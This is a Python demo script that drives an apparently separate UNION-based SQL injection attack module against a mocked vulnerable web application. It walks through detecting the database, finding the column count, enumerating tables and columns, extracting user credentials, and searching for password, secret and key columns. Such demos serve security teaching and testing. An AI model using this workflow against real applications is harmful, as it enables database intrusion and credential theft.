#!/usr/bin/env python3
"""
Demo script for UNION-based SQL Injection Attacker

This script demonstrates the capabilities of the UnionSQLInjectionAttacker module
with simulated vulnerable endpoints. It shows:
- Column count discovery
- DBMS detection  
- Table discovery
- Column discovery
- Data extraction
- Sensitive data search

Usage:
    python demo_union_sql_injection.py
"""

import sys
import time
from typing import Dict, Optional, Tuple

# Add parent directory to path if running standalone
if __name__ == "__main__":
    import os
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.union_sql_injection import UnionSQLInjectionAttacker, DBMSType


# Mock vulnerable application responses
class MockVulnerableApp:
    """
    Simulates a vulnerable web application for demonstration.
    
    This mock app responds to SQL injection payloads in a predictable way,
    allowing demonstration of the UNION attack techniques.
    """
    
    def __init__(self, dbms_type: DBMSType = DBMSType.MYSQL):
        self.dbms_type = dbms_type
        self.column_count = 4  # Simulated query uses 4 columns
        
        # Simulated database data
        self.tables = ['users', 'products', 'orders', 'admin_users']
        self.columns = {
            'users': [
                ('id', 'int'),
                ('username', 'varchar'),
                ('password', 'varchar'),
                ('email', 'varchar'),
                ('role', 'varchar')
            ],
            'products': [
                ('id', 'int'),
                ('name', 'varchar'),
                ('price', 'decimal'),
                ('description', 'text')
            ],
            'orders': [
                ('id', 'int'),
                ('user_id', 'int'),
                ('product_id', 'int'),
                ('quantity', 'int'),
                ('total', 'decimal')
            ],
            'admin_users': [
                ('id', 'int'),
                ('username', 'varchar'),
                ('password_hash', 'varchar'),
                ('secret_key', 'varchar')
            ]
        }
        self.data = {
            'users': [
                ['1', 'admin', 'admin123', 'admin@example.com', 'administrator'],
                ['2', 'john', 'pass123', 'john@example.com', 'user'],
                ['3', 'jane', 'jane456', 'jane@example.com', 'user'],
            ],
            'products': [
                ['1', 'Laptop', '999.99', 'High-performance laptop'],
                ['2', 'Mouse', '29.99', 'Wireless mouse'],
            ],
            'admin_users': [
                ['1', 'superadmin', 'sha256hash...', 'secret_api_key_xyz'],
            ]
        }
    
    def send_request(self, url: str, params: Optional[Dict]) -> Tuple[str, int, Dict]:
        """
        Simulate HTTP request to vulnerable application.
        
        Args:
            url: Request URL
            params: Query parameters
            
        Returns:
            Tuple of (response_body, status_code, headers)
        """
        # Simulate network delay
        time.sleep(0.01)
        
        # Extract injection payload from URL
        if '?id=' in url:
            payload = url.split('?id=')[1].split('&')[0] if '&' in url.split('?id=')[1] else url.split('?id=')[1]
        else:
            payload = ""
        
        # Normal request (baseline)
        if payload == "1" or not payload:
            return self._normal_response(), 200, {'Content-Type': 'text/html'}
        
        # Check for SQL errors (wrong column count)
        if 'UNION SELECT' in payload:
            null_count = payload.count('NULL')
            
            # Wrong column count = error
            if null_count > 0 and null_count != self.column_count:
                return self._error_response(), 200, {'Content-Type': 'text/html'}
            
            # Correct column count = success
            if null_count == self.column_count:
                # Check for injectable column markers
                for i in range(1, self.column_count + 1):
                    marker = f"INJECTABLE_{i}_TEST"
                    if marker in payload:
                        # Return response with marker visible (columns 2 and 3 are injectable)
                        if i in [2, 3]:
                            return self._injectable_response(marker), 200, {'Content-Type': 'text/html'}
                        else:
                            return self._normal_response(), 200, {'Content-Type': 'text/html'}
                
                # DBMS detection payloads
                if '@@version' in payload or 'VERSION()' in payload:
                    if self.dbms_type == DBMSType.MYSQL:
                        return self._dbms_response('MySQL 8.0.25'), 200, {'Content-Type': 'text/html'}
                
                if 'version()' in payload or 'pg_sleep' in payload:
                    if self.dbms_type == DBMSType.POSTGRESQL:
                        return self._dbms_response('PostgreSQL 13.3'), 200, {'Content-Type': 'text/html'}
                
                # Table discovery
                if 'FROM information_schema.tables' in payload or 'FROM all_tables' in payload:
                    return self._table_list_response(), 200, {'Content-Type': 'text/html'}
                
                # Column discovery
                if 'FROM information_schema.columns' in payload or 'FROM all_tab_columns' in payload:
                    # Extract table name from WHERE clause
                    table_name = self._extract_table_from_query(payload)
                    return self._column_list_response(table_name), 200, {'Content-Type': 'text/html'}
                
                # Data extraction
                if any(f'FROM {table}' in payload for table in self.tables):
                    table_name = None
                    for table in self.tables:
                        if f'FROM {table}' in payload:
                            table_name = table
                            break
                    return self._data_extraction_response(table_name, payload), 200, {'Content-Type': 'text/html'}
                
                # Generic successful UNION
                return self._union_success_response(), 200, {'Content-Type': 'text/html'}
        
        # Error-based detection
        if "'" in payload or '"' in payload:
            if not self._is_balanced_payload(payload):
                return self._error_response(), 200, {'Content-Type': 'text/html'}
        
        # Default response
        return self._normal_response(), 200, {'Content-Type': 'text/html'}
    
    def _normal_response(self):
        """Normal application response."""
        return """
        <html>
        <head><title>Product Details</title></head>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>Laptop</h2>
                <p>Price: $999.99</p>
                <p>Description: High-performance laptop for professionals</p>
            </div>
        </body>
        </html>
        """
    
    def _error_response(self):
        """SQL error response."""
        if self.dbms_type == DBMSType.MYSQL:
            return "<html><body><h1>Error</h1><p>You have an error in your SQL syntax near '1'</p></body></html>"
        elif self.dbms_type == DBMSType.POSTGRESQL:
            return "<html><body><h1>Error</h1><p>PostgreSQL ERROR: syntax error at or near</p></body></html>"
        elif self.dbms_type == DBMSType.MSSQL:
            return "<html><body><h1>Error</h1><p>SQL Server error: incorrect syntax near</p></body></html>"
        elif self.dbms_type == DBMSType.ORACLE:
            return "<html><body><h1>Error</h1><p>ORA-00933: SQL command not properly ended</p></body></html>"
        return "<html><body><h1>Database Error</h1></body></html>"
    
    def _injectable_response(self, marker):
        """Response showing injectable marker."""
        return f"""
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>{marker}</h2>
                <p>This field is injectable</p>
            </div>
        </body>
        </html>
        """
    
    def _dbms_response(self, version):
        """Response for DBMS detection."""
        return f"""
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>{version}</h2>
            </div>
        </body>
        </html>
        """
    
    def _union_success_response(self):
        """Generic successful UNION response."""
        return """
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>Laptop</h2>
                <p>Extra data from UNION query</p>
            </div>
        </body>
        </html>
        """
    
    def _table_list_response(self):
        """Response with table names."""
        tables_html = ' '.join(self.tables)
        return f"""
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>{tables_html}</h2>
            </div>
        </body>
        </html>
        """
    
    def _column_list_response(self, table_name):
        """Response with column names."""
        if table_name and table_name in self.columns:
            columns = self.columns[table_name]
            # Format: column_name|data_type
            col_html = ' '.join([f"{col[0]}|{col[1]}" for col in columns])
        else:
            col_html = "unknown_column|unknown_type"
        
        return f"""
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>{col_html}</h2>
            </div>
        </body>
        </html>
        """
    
    def _data_extraction_response(self, table_name, payload):
        """Response with extracted data."""
        if table_name and table_name in self.data:
            # Extract requested columns from CONCAT
            data_rows = self.data[table_name]
            # Format: value1|value2|value3
            data_html = ' '.join(['|'.join(row) for row in data_rows[:3]])  # Limit to 3 rows
        else:
            data_html = "no_data"
        
        return f"""
        <html>
        <body>
            <h1>Product Information</h1>
            <div class="product">
                <h2>{data_html}</h2>
            </div>
        </body>
        </html>
        """
    
    def _extract_table_from_query(self, payload):
        """Extract table name from WHERE clause."""
        if "table_name='" in payload:
            start = payload.index("table_name='") + 12
            end = payload.index("'", start)
            return payload[start:end]
        elif "table_name LIKE" in payload:
            # Pattern matching - return first table that might match
            return self.tables[0] if self.tables else None
        return None
    
    def _is_balanced_payload(self, payload):
        """Check if quotes are balanced."""
        single_quote_count = payload.count("'")
        double_quote_count = payload.count('"')
        return single_quote_count % 2 == 0 and double_quote_count % 2 == 0


def print_banner():
    """Print demo banner."""
    print("=" * 70)
    print("  UNION-Based SQL Injection Attacker - Demonstration")
    print("=" * 70)
    print()


def print_section(title):
    """Print section header."""
    print()
    print("-" * 70)
    print(f"  {title}")
    print("-" * 70)


def demo_basic_attack():
    """Demonstrate basic UNION SQL injection attack."""
    print_banner()
    
    # Create mock vulnerable application
    print("Setting up mock vulnerable application (MySQL)...")
    mock_app = MockVulnerableApp(dbms_type=DBMSType.MYSQL)
    
    # Initialize attacker
    print("Initializing UNION SQL Injection Attacker...")
    attacker = UnionSQLInjectionAttacker(
        send_request_callback=mock_app.send_request,
        max_columns=10,
        delay=0.01  # Low delay for demo
    )
    print("✓ Attacker initialized\n")
    
    # Set target
    print_section("Step 1: Setting Target")
    target_url = "http://vulnerable-app.local/product?id=1"
    print(f"Target URL: {target_url}")
    attacker.set_target(target_url)
    print(f"Injection point: {attacker.injection_point}")
    print(f"Baseline response length: {attacker.baseline_length} bytes")
    print("✓ Target configured")
    
    # Detect DBMS
    print_section("Step 2: Detecting DBMS")
    print("Attempting to detect database management system...")
    dbms = attacker.detect_dbms()
    print(f"✓ Detected DBMS: {dbms.value.upper()}")
    
    # Discover column count
    print_section("Step 3: Discovering Column Count")
    print("Testing UNION SELECT with incrementing NULL values...")
    column_count = attacker.discover_column_count()
    if column_count:
        print(f"✓ Discovered {column_count} columns")
        print(f"✓ Injectable columns: {attacker.injectable_columns}")
    else:
        print("✗ Failed to discover column count")
        return
    
    # Discover tables
    print_section("Step 4: Discovering Tables")
    print("Querying information_schema.tables...")
    tables = attacker.discover_tables()
    print(f"✓ Found {len(tables)} tables:")
    for table in tables:
        print(f"  - {table}")
    
    # Discover columns in interesting tables
    if 'users' in [t.lower() for t in tables]:
        print_section("Step 5: Discovering Columns in 'users' Table")
        print("Querying information_schema.columns for 'users' table...")
        columns = attacker.discover_columns('users')
        print(f"✓ Found {len(columns)} columns:")
        for col in columns:
            print(f"  - {col['column_name']} ({col['data_type']})")
        
        # Extract data
        if columns:
            print_section("Step 6: Extracting Data from 'users' Table")
            col_names = [c['column_name'] for c in columns[:4]]  # First 4 columns
            print(f"Extracting columns: {', '.join(col_names)}")
            data = attacker.extract_data('users', col_names, limit=5)
            
            if data:
                print(f"✓ Extracted {len(data)} rows:")
                for i, row in enumerate(data, 1):
                    print(f"\n  Row {i}:")
                    for key, value in row.items():
                        print(f"    {key}: {value}")
            else:
                print("  (No data extracted - check response parsing)")
    
    # Search for sensitive data
    print_section("Step 7: Searching for Sensitive Data")
    print("Scanning for password-related columns...")
    sensitive = attacker.search_sensitive_columns(
        patterns=['%pass%', '%secret%', '%key%']
    )
    
    if sensitive:
        print(f"✓ Found sensitive data in {len(sensitive)} tables:")
        for table, columns in sensitive.items():
            print(f"\n  Table: {table}")
            for col in columns:
                print(f"    - {col['column_name']} ({col['data_type']})")
    else:
        print("  (No sensitive columns found)")
    
    print()
    print("=" * 70)
    print("  Demo Complete!")
    print("=" * 70)
    print()


def demo_different_dbms():
    """Demonstrate attacks against different DBMS types."""
    print_banner()
    print("Demonstrating attacks against different database systems...")
    
    dbms_types = [
        (DBMSType.MYSQL, "MySQL"),
        (DBMSType.POSTGRESQL, "PostgreSQL"),
        (DBMSType.MSSQL, "Microsoft SQL Server"),
        (DBMSType.ORACLE, "Oracle Database"),
    ]
    
    for dbms_type, dbms_name in dbms_types:
        print_section(f"Testing {dbms_name}")
        
        # Create mock app for this DBMS
        mock_app = MockVulnerableApp(dbms_type=dbms_type)
        
        # Initialize attacker
        attacker = UnionSQLInjectionAttacker(
            send_request_callback=mock_app.send_request,
            dbms_type=dbms_type,  # Pre-specify DBMS
            max_columns=10,
            delay=0.01
        )
        
        attacker.set_target("http://vulnerable-app.local/product?id=1")
        
        # Test column discovery
        column_count = attacker.discover_column_count()
        if column_count:
            print(f"  ✓ Column count: {column_count}")
            print(f"  ✓ Injectable columns: {attacker.injectable_columns}")
            
            # Test concatenation function
            concat = attacker._get_concat_function(['col1', "'|'", 'col2'])
            print(f"  ✓ Concatenation syntax: {concat}")
        else:
            print(f"  ✗ Failed column discovery")
    
    print()
    print("=" * 70)
    print("  Multi-DBMS Demo Complete!")
    print("=" * 70)
    print()


def main():
    """Main demo function."""
    print("\nSelect demo mode:")
    print("1. Basic UNION Attack Demo (Recommended)")
    print("2. Multi-DBMS Demo")
    print("3. Both")
    
    try:
        choice = input("\nEnter choice (1-3) [1]: ").strip() or "1"
        
        if choice == "1":
            demo_basic_attack()
        elif choice == "2":
            demo_different_dbms()
        elif choice == "3":
            demo_basic_attack()
            print("\n" * 2)
            demo_different_dbms()
        else:
            print("Invalid choice. Running basic demo...")
            demo_basic_attack()
    
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n\nError during demo: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
